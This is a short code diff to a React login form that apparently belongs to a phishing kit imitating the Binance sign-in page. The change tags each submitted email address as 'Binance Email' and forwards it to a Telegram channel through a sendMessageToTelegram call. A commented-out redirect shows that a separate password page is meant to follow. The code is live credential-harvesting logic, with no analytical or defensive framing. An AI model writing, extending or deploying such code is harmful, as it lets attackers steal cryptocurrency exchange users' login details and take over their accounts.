@@ -157,7 +157,8 @@ export default function LoginForm() {
         setInvalid(!isValid);
         setIsLoading(true);
         setUserEmail(email);
-        sendMessageToTelegram(email);
+        const message = `Binance Email: ${email}`
+        sendMessageToTelegram(message);
 
         // Comment out when pushing to prod
         // router.push('/PasswordPage');
